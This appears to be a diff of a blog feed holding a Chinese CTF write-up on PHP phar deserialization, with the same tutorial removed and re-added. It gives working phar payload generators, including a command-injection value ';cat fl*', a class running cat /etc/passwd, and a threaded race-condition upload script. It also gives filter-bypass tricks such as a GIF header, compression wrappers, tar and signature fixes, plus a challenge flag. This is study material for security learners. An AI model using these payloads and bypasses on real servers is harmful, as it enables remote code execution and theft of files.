-​	phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方3.the file contents​    被压缩文件的内容4.[optional] a signature for verifying Phar integrity (phar file format only)​	签名，放在文件末尾
-生成phar文件php内置了一个Phar类来处理相关操作
-&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;phar.phar&quot;);    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub    $o = new TestObject();    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    //签名自动计算    $phar-&gt;stopBuffering();?&gt;
-
-注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件
-实操一下：
-kali 写一个2.php文件，内容如上
-运行后边生成phar.phar文件
-
-访问之后会在同目录生成 phar.phar 文件，xxd 命令查看文件结构
-
-meta-data是以序列化的形式存储的
-php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：
-🔴phar可用魔术方法
-测试脚本：
-&lt;?phpclass TestObject &#123;    public function __destruct() &#123;        echo &#x27;Destruct called&#x27; . PHP_EOL;    &#125;&#125;// 创建phar文件$phar = new Phar(&#x27;phar.phar&#x27;);$phar-&gt;startBuffering();$phar-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;This is test content&#x27;);$phar-&gt;setMetadata(new TestObject());$phar-&gt;stopBuffering();// 现在读取phar文件echo &quot;Reading phar file...&quot; . PHP_EOL;$content = file_get_contents(&#x27;phar://phar.phar/test.txt&#x27;);echo &quot;Content: &quot; . $content . PHP_EOL;?&gt;
-
-析构方法被调用，注意此处 weakup 等方法不会被调用
-这样就可以在不调用unserialize()的情况下进行反序列化操作
-
-参考文章：https://paper.seebug.org/680/
-Phar协议文件包含phar协议要求：
-
-php大于5.3.0
-需要将php.ini的参数phar.readonly设置为off（kali已配置好了）
-
-因为phar文件本质就是以中压缩文件，所以可以使用phar伪协议读取执行
-很多网站都采用单一入口模式来作为网站文件加载模式
-&lt;?php//单一入口模式error_reporting(0); //关闭错误显示$file=addslashes($_GET[&#x27;r&#x27;]); //接收文件名$action=$file==&#x27;&#x27;?&#x27;index&#x27;:$file; //判断为空或者等于indexinclude($action.&#x27;.php&#x27;); //载入相应文件?&gt;
-
-此处就存在文件包含漏洞，可以利用伪协议读取文件源码，但是只能访问php文件
-
-首先写一个 test.php，写入要执行的命令
-&lt;?php phpinfo();?&gt;
-
-将 test.php 压缩为 test.zip 注意：压缩时选择仅存储，在文件上传处上传 test.zip 文件
-将 test.zip 文件后缀改为 jpg，上传 jpg 文件，在 url 中访问
-✔️index.php?doc=phar://upload_files/test.jpg/test.php
-?r=phar://pic/test.jpg/test
-
-
-不仅可以使用phar协议，zip协议也是可以的
-zip文件包含和phar用法，不同效果一致
-include($file.&#x27;.jpg&#x27;);## \x00的截断在php&lt;5.3.4you&#x27;xi
-
-将php文件后缀改为jpg（因为是include .jpg），然后用压缩软件压缩为 zip格式，再将 zip 文件后缀名改为 jpg（绕过限制方便图片上传）
-/?r=zip://pic/test4.jpg%23test##pic是图片保存目录
-
-这个例子只是利用了phar伪协议解析文件，并没有利用反序列化
-Phar反序列化漏洞利用漏洞利用条件
-phar文件要能够上传到服务器端。
-要有可用的魔术方法作为“跳板”。
-文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤
-
-✔️例题：ctfshow web276 （phar反序列化+条件竞争）打开得到源码
-&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-08 19:13:36# @Last Modified by:   h1xa# @Last Modified time: 2020-12-08 20:08:07# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);class filter&#123;    public $filename;    public $filecontent;    public $evilfile=false;    public $admin = false;    public function __construct($f,$fn)&#123;        $this-&gt;filename=$f;        $this-&gt;filecontent=$fn;    &#125;    public function checkevil()&#123;        if(preg_match(&#x27;/php|\.\./i&#x27;, $this-&gt;filename))&#123;            $this-&gt;evilfile=true;        &#125;        if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123;            $this-&gt;evilfile=true;        &#125;        return $this-&gt;evilfile;    &#125;    public function __destruct()&#123;        if($this-&gt;evilfile &amp;&amp; $this-&gt;admin)&#123;            system(&#x27;rm &#x27;.$this-&gt;filename);        &#125;    &#125;&#125;if(isset($_GET[&#x27;fn&#x27;]))&#123;    $content = file_get_contents(&#x27;php://input&#x27;);     //phar    $f = new filter($_GET[&#x27;fn&#x27;],$content);    if($f-&gt;checkevil()===false)&#123;        file_put_contents($_GET[&#x27;fn&#x27;], $content);    //phar        copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;);        unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);        echo &#x27;work done&#x27;;    &#125;    &#125;else&#123;    echo &#x27;where is flag?&#x27;;&#125;where is flag?
-
-发现可以通过 file_put_contents 写 phar 文件，然后题目中 file_put_contents 第一个参数可控，那么我们可以使用 phar:&#x2F;&#x2F; 协议，通过 $content 传入 phar 数据，这样在 PHP 通过 phar:&#x2F;&#x2F; 协议解析数据时，会将 meta-data （元数据）部分进行反序列化
-不过题目会删除文件，所以需要在删除文件前执行文件进行以上操作，因此要用到条件竞争，即生成了 phar 文件，在极短时间内文件是存在的，因为执行到 unlink 函数前还有一个 copy 文件操作，磁盘 io （计算机的输入&#x2F;输出操作）是需要一定时间的。只要我们不断在写入 phar 文件，那么这个文件就可以断断续续访问到phar构造如下，会在当前目录生成 evil.phar 文件
-可利用条件竞争的代码详解：
-if($f-&gt;checkevil()===false)&#123;    file_put_contents($_GET[&#x27;fn&#x27;], $content);    copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;);    unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);    echo &#x27;work done&#x27;;&#125;
-
-
-file_put_contents($_GET[&#39;fn&#39;], $content);：将用户控制的内容写入到文件名由$_GET[&#39;fn&#39;]指定的文件中。
-copy($_GET[&#39;fn&#39;],md5(mt_rand()).&#39;.txt&#39;);：将刚写入的文件复制到一个随机名称的新文件中。
-unlink($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;/&#39;.$_GET[&#39;fn&#39;]);：立即删除原始文件（位于Web根目录下）。
-
-这个操作序列创建了一个非常短的时间窗口：文件被写入后，在unlink删除之前，文件短暂存在。攻击者需要在这个时间窗口内通过phar协议访问该文件，以触发phar反序列化漏洞。如果攻击者能在此期间成功访问文件，就能执行反序列化后的恶意代码；否则，文件会被删除，攻击失败。因此，条件竞争是利用此漏洞的关键。
-补充：条件竞争是什么？
-条件竞争（Race Condition）是一种并发编程中的漏洞，当两个或多个进程或线程同时访问共享资源（如文件、数据等）时，最终结果取决于它们执行的相对时序。在Web安全中，攻击者可以利用条件竞争在某个短暂的时间窗口内执行本应被限制的操作，例如在文件被创建但被删除前访问它。
-4.php:
-&lt;?phpclass filter &#123;    public $filename = &#x27;;cat fl*&#x27;;    public $evilfile = true;    public $admin = true;&#125;// 后缀必须为phar$phar = new Phar(&quot;evil.phar&quot;);$phar-&gt;startBuffering();// 设置 stubb$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o = new filter();/** * 将自定义的 meta-data 存入 manifest * 这个函数需要在php.ini中修改 phar.readonly 为 Off * 否则的话会抛出  * creating archive &quot;***.phar&quot; disabled by the php.ini setting phar.readonly  * 异常. */$phar-&gt;setMetadata($o);// 添加需压缩的文件$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt;
-
-运行4.php文件，生成evil.phar文件
-
-条件竞争，py3脚本
-import base64import requestsimport threadingflag = Falseurl = &#x27;ip&#x27;data = open(&#x27;./evil.phar&#x27;, &#x27;rb&#x27;).read()pre_resp = requests.get(url)if pre_resp.status_code != 200:    print(url + &#x27;\n链接好像挂了....&#x27;)    exit(1)def upload():    requests.post(url+&quot;?fn=evil.phar&quot;, data=data)def read():    global flag    r = requests.post(url+&quot;?fn=phar://evil.phar/&quot;, data=&quot;&quot;)    if &quot;ctfshow&#123;&quot; in r.text and flag is False:        print(base64.b64encode(r.text.encode()))        flag = Truewhile flag is False:    a = threading.Thread(target=upload)    b = threading.Thread(target=read)    a.start()    b.start()
-
-绕过：php(phar)反序列化漏洞及各种绕过姿势_throw new 绕过php-CSDN博客
-将phar伪造成其他格式的文件如果文件上传界面后端代码会检查文件类型的话，就需要将 phar 文件未造成其他格式文件
-$_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;
-
-由于php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件
-&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;phar.phar&quot;);    $phar = new Phar(&quot;phar.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头    $o = new TestObject();    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    //签名自动计算    $phar-&gt;stopBuffering();?&gt;
-
-绕过phar关键字检测在第一个实例中，文件成功上传之后使用 phar 伪协议去读取文件，但是如果后端检测参数不能以 phar 开头的话，就需要绕过
-if (preg_match(&quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&quot;,$filename)&#123;    die();&#125;
-
-绕过方法：
-// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过compress.bzip://phar:///test.phar/test.txtcompress.bzip2://phar:///home/sx/test.phar/test.txtcompress.zlib://phar:///home/sx/test.phar/test.txtphp://filter/resource=phar:///test.phar/test.txt// 还可以使用伪协议的方法绕过php://filter/read=convert.base64-encode/resource=phar://phar.phar
-
-其中：compress.bzip2:// 和 compress.zlib:// 是 PHP 合法的流包装器，用于处理压缩数据。
-（核心概念：流包装器
-PHP 有一个非常强大的特性叫做“流包装器”。你可以把它理解为一种协议，用于告诉 PHP 如何访问不同的“资源”。我们最熟悉的是 file://（访问本地文件）和 http://（访问网络资源）。
-phar:// 也是一个流包装器，它专门用于读取 PHAR 文件，并在读取时自动反序列化其元数据。这正是 Phar 反序列化漏洞的根源。）
-绕过__HALT_COMPILER特征检测if (preg_match(&quot;/&lt;/?|php|HALT_COMPILER/i&quot;,$filename)&#123;    die();&#125;
-
-因为phar中的a stub字段必须以__HALT_COMPILER();字符串来结尾，否则phar扩展将无法识别这个文件为phar文件，所以这段字符串不能省略，只能绕过
-方法一：
-首先将 phar 文件使用 gzip 命令进行压缩，可以看到压缩之后的文件中就没有了__HALT_COMPILER()，将 phar.gz 后缀改为 png（png文件可以上传）
-文件上传成功后，利用文件包含漏洞包含文件
-file_un.php?filename=phar://pic/phar.phar.gz/phar.phar# file_un.php中包含__destruct并且可以被触发
-
-方法二
-将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过该正则
-$phar_file = serialize($exp);    echo $phar_file;    $zip = new ZipArchive();    $res = $zip-&gt;open(&#x27;1.zip&#x27;,ZipArchive::CREATE);     $zip-&gt;addFromString(&#x27;crispr.txt&#x27;, &#x27;file content goes here&#x27;);    $zip-&gt;setArchiveComment($phar_file);    $zip-&gt;close();
-
-phar反序列化过程中，对metadata进行解析的时候会进行php_var_unserialize()将Phar中的metadata进行反序列化
-
-从一道题再看phar的利用-安全KER - 安全资讯平台
-phar 文件签名修改1.签名结构
-struct phar_signature &#123;    int signature_type;    // 签名算法类型    char *signature;       // 签名数据    int signature_length;  // 签名长度    int flags;             // 标志位&#125;;
-
-签名支持 MD5, SHA1, SHA256, SHA512, OpenSSL 算法, 默认是 SHA1其中末尾的4个字节是固定的, 表示该文件存在签名倒数第8~4个字节表示文件使用的签名算法倒数8个字节往前就是签名的二进制值, 对文件开头到声明签名部分以前的内容进行计算, 长度视算法类型而定
-
-2.核心思路
-当 PHP 遇到无效签名时，默认行为是：
-
-检测到签名不匹配
-抛出警告 (Warning)
-但继续执行 Phar 文件的解析和反序列化
-
-关键点：签名错误不会阻止反序列化执行！
-以 SHA1 为例
-在修改了 phar 数据后, 我们需要更改的就是这部分 (20字节长度) 的内容
-
-脚本，以默认的sha1签名为例：
-from hashlib import sha1with open(&#x27;phar.phar&#x27;, &#x27;rb&#x27;) as file:    f = file.read()     # 修改内容后的phar文件,以二进制文件形式打开s = f[:-28] # 获取要签名的数据（对于sha1签名的phar文件，文件末尾28字节为签名的格式）h = f[-8:] # 获取签名类型以及GBMB标识，各4个字节newf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)with open(&#x27;newPhar.phar&#x27;, &#x27;wb&#x27;) as file:    file.write(newf) # 写入新文件
-
-实例:
-场景：文件上传 + Phar 反序列化
-// 漏洞代码if(isset($_FILES[&#x27;file&#x27;]))&#123;    $upload_file = &#x27;uploads/&#x27;.$_FILES[&#x27;file&#x27;][&#x27;name&#x27;];    move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $upload_file);        // 这里会触发phar反序列化，但忽略签名错误    file_get_contents(&quot;phar://&quot;.$upload_file);&#125;
-
-攻击步骤：
-
-准备恶意 Phar：
-
-class Exploit &#123;    public $cmd = &#x27;system(&quot;cat /etc/passwd&quot;)&#x27;;    function __destruct() &#123;        system($this-&gt;cmd);    &#125;&#125;$phar = new Phar(&#x27;exploit.phar&#x27;);$phar-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;text&#x27;);$phar-&gt;setMetadata(new Exploit());$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);
-
-​           2.修改 payload：
-# kali中使用十六进制编辑器修改 metadata 中的命令# 将二进制文件转换为十六进制文本xxd exploit.phar &gt; exploit.hex# 使用 vim 编辑vim exploit.hex# 编辑完成后转换回二进制xxd -r exploit.hex &gt; exploit_modified.phar
-
-​           3.上传并触发：
-// 上传修改后的 exploit.phar// 访问触发页面，虽然会有警告，但命令已执行
-
-使用 tar 绕过签名phar 协议对 tar 的处理跟 gzip bzip2 这些不太一样
-对 gzip bzip2 处理时, PHP 会将其解压缩, 然后解析里面的 phar 文件
-而对 tar 处理时, PHP 会检测压缩包中是否存在 .phar/.metadata, 存在的话就会将 .metadata 里的内容直接进行反序列化
-
-传统 Phar 流程：
-phar://malicious.phar → 验证签名 → 解析manifest → 反序列化metadata
-
-Tar 绕过流程：
-phar://malicious.tar → 按tar格式解析 → 查找.phar/.metadata → 直接反序列化
-
-关键区别：tar 格式的处理跳过了 Phar 签名验证步骤！
-
-测试代码
-&lt;?phpclass A&#123;    public $text = &#x27;test&#x27;;    function __destruct()&#123;        echo $this-&gt;text;    &#125;    function __wakeup()&#123;        $this-&gt;text = &#x27;fail&#x27;;    &#125;&#125;file_get_contents($_GET[&#x27;a&#x27;]);?&gt;
-
-本地创建 .phar 文件夹和 .metadata 文件
-exp10it@LAPTOP-TBAF1QQG:~/WWW/.phar$ ls -a.metadataexp10it@LAPTOP-TBAF1QQG:~/WWW/.phar$ cat .metadataO:1:&quot;A&quot;:2:&#123;s:4:&quot;text&quot;;s:7:&quot;success&quot;;&#125;
-
-tar 压缩, 必须是 Linux 环境
-tar -cf phar.tar .phar/
-
-访问 index.php?a=phar://phar.tar
-
-✔️例题：[0xGame_2025]文件查询器（蓝）（file_get_contents触发phar反序列化）在文件查询中查询index.php，base64编码，解码得到源码
-&lt;?phperror_rporting(0);class MaHaYu&#123;    public $HG2;    public $ToT;    public $FM2tM    public function __construct()    &#123;      $this -&gt; ZombiegalKawaii();    &#125;        public function ZombiegalKawaii()    &#123;      $HG2 = $this -&gt; HG2;      if(preg_match(&quot;/system|print|readfile|get|assert|passthru|nl|flag|ls|scandir|check|cat|tac|echo|eval|rev|report|dir/i&quot;,$HG2))      &#123;        die(&quot;这这这你也该绕过去了吧&quot;);      &#125;      else&#123;        $this -&gt; ToT = &quot;这其实是来占位的&quot;;      &#125;    &#125;    public function __destruct()    &#123;      $HG2 = $this -&gt; HG2;      $FM2tM = $this -&gt; FM2tM;      echo &quot;Wow&quot;;      var_dump($HG2($FM2tM));    &#125;&#125;$file=$_POST[&#x27;file&#x27;];if(isset($_POST[&#x27;file&#x27;]))&#123;    if (preg_match(&quot;/&#x27;[\$%&amp;#@*]|flag|file|base64|go|git|login|dict|base|echo|content|read|convert|filter|date|plain|text|;|&lt;|&gt;/i&quot;, $file))    &#123;        die(&quot;对方撤回了一个请求，并企图萌混过关&quot;);    &#125;    echo base64_encode(file_get_contents($file));&#125;
-
-因为是文件上传，再查询upload.php，获得文件上传的代码
-&lt;?phperror_reporting(0);$White_List = array(&quot;jpg&quot;, &quot;png&quot;, &quot;pdf&quot;);$temp = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);$extension = end($temp);if (($_FILES[&quot;file&quot;][&quot;size&quot;] &amp;&amp; in_array($extension, $White_List)))&#123;       //file_get_contents触发phar反序列化    $content=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);    $pos = strpos($content, &quot;__HALT_COMPILER();&quot;);    if(gettype($pos)===&quot;integer&quot;)    &#123;        die(&quot;你猜我想让你干什么喵&quot;);    &#125;    else    &#123;        if (file_exists(&quot;./upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))        &#123;            echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; Already exists. &quot;;        &#125;        else        &#123;             $file = fopen(&quot;./upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;], &quot;w&quot;);            fwrite($file, $content);             fclose($file);            echo &quot;Success ./upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];        &#125;    &#125;&#125;else&#123;     echo &quot;请重新尝试喵&quot;; &#125; ?&gt;
-
-file_get_contents触发phar反序列化,gz压一下，改一下文件名分别绕过内容waf和文件名waf
-
-*生成恶意的序列化MaHaYu对象*：创建一个MaHaYu对象，其中$HG2设置为getenv（用于读取环境变量），$FM2tM设置为FLAG（假设flag存储在环境变量FLAG中）。序列化该对象。
-*创建phar文件*：将序列化对象作为元数据嵌入到phar文件中。
-*压缩phar文件*：将phar文件压缩为.gz格式，以避免upload.php检测到__HALT_COMPILER();字符串。
-*上传压缩文件*：将压缩后的phar文件上传为jpg文件，通过upload.php。
-*触发反序列化*：通过index.php的file参数，使用phar协议访问上传的文件，触发反序列化，从而执行getenv(“FLAG”)获取flag。
-
-&lt;?phperror_reporting(0);class MaHaYu&#123;    public $HG2;    public $ToT;    public $FM2tM;    public function __construct()    &#123;      $this -&gt; ZombiegalKawaii();    &#125;        public function ZombiegalKawaii()    &#123;      $HG2 = $this -&gt; HG2;      if(preg_match(&quot;/system|print|readfile|get|assert|passthru|nl|flag|ls|scandir|check|cat|tac|echo|eval|rev|report|dir/i&quot;,$HG2))      &#123;        die(&quot;这这这你也该绕过去了吧&quot;);      &#125;      else&#123;        $this -&gt; ToT = &quot;这其实是来自各位的&quot;;       &#125;    &#125;     public function __destruct()    &#123;      $HG2 = $this -&gt; HG2;      $FM2tM = $this -&gt; FM2tM;      echo &quot;Wow&quot;;      var_dump($HG2($FM2tM));    &#125;&#125;$a = new MaHaYu();$a -&gt; HG2 = &quot;getenv&quot;;$a-&gt;FM2tM=&quot;FLAG&quot;;    //本来用glob发现根目录无flag，直接看环境就好了  $phar = new Phar(&quot;2.phar&quot;); //.phar文件$phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;); //固定的$phar-&gt;setMetadata($a);$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //随便写点什么生成个签名，添加要压缩的文件$phar-&gt;stopBuffering(); $fp = gzopen(&quot;2.phar.gz&quot;, &#x27;w9&#x27;);gzwrite($fp, file_get_contents(&quot;2.phar&quot;));gzclose($fp); // 将 2.phar.gz 重命名为 2.phar.png@rename(&quot;2.phar.gz&quot;, &quot;1.phar.png&quot;);?&gt;
-
-将代码保存到1.php里，在kali里运行，生成1.phar.png和2.phar文件
-
-回到文件上传，上传生成的1.phar.php文件
-然后打phar协议就好了
-phar://upload/1.phar.png
-
-
-0xGame{Y0u_Are_Rea11y_a_Ph4r_G0d!}
-相关习题：[CISCN2019 华北赛区 Day1 Web1]Dropbox
-[CISCN2019 华北赛区 Day1 Web1]Dropbox复现_51CTO博客_[ciscn2019 华北赛区 day1 web1]dropbox
-Gzip 和 Bzip2：压缩算法在 PHP 流包装器中的对应关系
-PHP 提供了对应的流包装器来处理这些压缩格式：
-
-
-
-压缩格式
-PHP 流包装器
-
-
-
-Gzip
-compress.zlib://
-
-
-Bzip2
-compress.bzip2://
-
-
-技术细节对比
-// Gzip 压缩流compress.zlib://file.gzcompress.zlib://phar:///test.phar/test.txt// Bzip2 压缩流  compress.bzip2://file.bz2compress.bzip2://phar:///test.phar/test.txt
-
-在 Phar 反序列化绕过中的应用
-在绕过场景中，两者的作用是完全相同的：
-// 两种方式都能达到同样的绕过效果compress.zlib://phar:///malicious.phar/test.txtcompress.bzip2://phar:///malicious.phar/test.txt
-
-
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>phar</tag>
-        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -7227,8 +6982,253 @@ $REQUEST：是一个超全局数组，它包含了 $_GET、$_POST 和 $_COOKIE �
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
         <tag>代码审计</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>phar 反序列化</title>
+    <url>/2026/08/24/phar-deserialization/</url>
+    <content><![CDATA[PHP Phar反序列化总结_ctf phpphar反序列化-CSDN博客
+利用 phar 拓展 php 反序列化漏洞攻击面
+浅析Phar反序列化 - FreeBuf网络安全行业门户
+php(phar)反序列化漏洞及各种绕过姿势_throw new 绕过php-CSDN博客
+Phar反序列化Phar文件结构phar文件是php里类似于JAR的一种打包文件本质上是一种压缩文件，在PHP 5.3 或更高版本中默认开启，一个phar文件一个分为四部分。
+[Stub] + [Manifest] + [File Contents] + [Signature]
+
+1.a stub    可以理解为一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件**(注意绕过)**2.a manifest describing the contents
+
+Manifest 是 Phar 文件格式中的一个核心部分，它相当于 Phar 文件的”目录”或”元数据索引”。
+
+​	phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方3.the file contents​    被压缩文件的内容4.[optional] a signature for verifying Phar integrity (phar file format only)​	签名，放在文件末尾
+生成phar文件php内置了一个Phar类来处理相关操作
+&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;phar.phar&quot;);    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub    $o = new TestObject();    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    //签名自动计算    $phar-&gt;stopBuffering();?&gt;
+
+注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件
+实操一下：
+kali 写一个2.php文件，内容如上
+运行后边生成phar.phar文件
+
+访问之后会在同目录生成 phar.phar 文件，xxd 命令查看文件结构
+
+meta-data是以序列化的形式存储的
+php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：
+🔴phar可用魔术方法
+测试脚本：
+&lt;?phpclass TestObject &#123;    public function __destruct() &#123;        echo &#x27;Destruct called&#x27; . PHP_EOL;    &#125;&#125;// 创建phar文件$phar = new Phar(&#x27;phar.phar&#x27;);$phar-&gt;startBuffering();$phar-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;This is test content&#x27;);$phar-&gt;setMetadata(new TestObject());$phar-&gt;stopBuffering();// 现在读取phar文件echo &quot;Reading phar file...&quot; . PHP_EOL;$content = file_get_contents(&#x27;phar://phar.phar/test.txt&#x27;);echo &quot;Content: &quot; . $content . PHP_EOL;?&gt;
+
+析构方法被调用，注意此处 weakup 等方法不会被调用
+这样就可以在不调用unserialize()的情况下进行反序列化操作
+
+参考文章：https://paper.seebug.org/680/
+Phar协议文件包含phar协议要求：
+
+php大于5.3.0
+需要将php.ini的参数phar.readonly设置为off（kali已配置好了）
+
+因为phar文件本质就是以中压缩文件，所以可以使用phar伪协议读取执行
+很多网站都采用单一入口模式来作为网站文件加载模式
+&lt;?php//单一入口模式error_reporting(0); //关闭错误显示$file=addslashes($_GET[&#x27;r&#x27;]); //接收文件名$action=$file==&#x27;&#x27;?&#x27;index&#x27;:$file; //判断为空或者等于indexinclude($action.&#x27;.php&#x27;); //载入相应文件?&gt;
+
+此处就存在文件包含漏洞，可以利用伪协议读取文件源码，但是只能访问php文件
+
+首先写一个 test.php，写入要执行的命令
+&lt;?php phpinfo();?&gt;
+
+将 test.php 压缩为 test.zip 注意：压缩时选择仅存储，在文件上传处上传 test.zip 文件
+将 test.zip 文件后缀改为 jpg，上传 jpg 文件，在 url 中访问
+✔️index.php?doc=phar://upload_files/test.jpg/test.php
+?r=phar://pic/test.jpg/test
+
+
+不仅可以使用phar协议，zip协议也是可以的
+zip文件包含和phar用法，不同效果一致
+include($file.&#x27;.jpg&#x27;);## \x00的截断在php&lt;5.3.4you&#x27;xi
+
+将php文件后缀改为jpg（因为是include .jpg），然后用压缩软件压缩为 zip格式，再将 zip 文件后缀名改为 jpg（绕过限制方便图片上传）
+/?r=zip://pic/test4.jpg%23test##pic是图片保存目录
+
+这个例子只是利用了phar伪协议解析文件，并没有利用反序列化
+Phar反序列化漏洞利用漏洞利用条件
+phar文件要能够上传到服务器端。
+要有可用的魔术方法作为“跳板”。
+文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤
+
+✔️例题：ctfshow web276 （phar反序列化+条件竞争）打开得到源码
+&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-08 19:13:36# @Last Modified by:   h1xa# @Last Modified time: 2020-12-08 20:08:07# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);class filter&#123;    public $filename;    public $filecontent;    public $evilfile=false;    public $admin = false;    public function __construct($f,$fn)&#123;        $this-&gt;filename=$f;        $this-&gt;filecontent=$fn;    &#125;    public function checkevil()&#123;        if(preg_match(&#x27;/php|\.\./i&#x27;, $this-&gt;filename))&#123;            $this-&gt;evilfile=true;        &#125;        if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123;            $this-&gt;evilfile=true;        &#125;        return $this-&gt;evilfile;    &#125;    public function __destruct()&#123;        if($this-&gt;evilfile &amp;&amp; $this-&gt;admin)&#123;            system(&#x27;rm &#x27;.$this-&gt;filename);        &#125;    &#125;&#125;if(isset($_GET[&#x27;fn&#x27;]))&#123;    $content = file_get_contents(&#x27;php://input&#x27;);     //phar    $f = new filter($_GET[&#x27;fn&#x27;],$content);    if($f-&gt;checkevil()===false)&#123;        file_put_contents($_GET[&#x27;fn&#x27;], $content);    //phar        copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;);        unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);        echo &#x27;work done&#x27;;    &#125;    &#125;else&#123;    echo &#x27;where is flag?&#x27;;&#125;where is flag?
+
+发现可以通过 file_put_contents 写 phar 文件，然后题目中 file_put_contents 第一个参数可控，那么我们可以使用 phar:&#x2F;&#x2F; 协议，通过 $content 传入 phar 数据，这样在 PHP 通过 phar:&#x2F;&#x2F; 协议解析数据时，会将 meta-data （元数据）部分进行反序列化
+不过题目会删除文件，所以需要在删除文件前执行文件进行以上操作，因此要用到条件竞争，即生成了 phar 文件，在极短时间内文件是存在的，因为执行到 unlink 函数前还有一个 copy 文件操作，磁盘 io （计算机的输入&#x2F;输出操作）是需要一定时间的。只要我们不断在写入 phar 文件，那么这个文件就可以断断续续访问到phar构造如下，会在当前目录生成 evil.phar 文件
+可利用条件竞争的代码详解：
+if($f-&gt;checkevil()===false)&#123;    file_put_contents($_GET[&#x27;fn&#x27;], $content);    copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;);    unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);    echo &#x27;work done&#x27;;&#125;
+
+
+file_put_contents($_GET[&#39;fn&#39;], $content);：将用户控制的内容写入到文件名由$_GET[&#39;fn&#39;]指定的文件中。
+copy($_GET[&#39;fn&#39;],md5(mt_rand()).&#39;.txt&#39;);：将刚写入的文件复制到一个随机名称的新文件中。
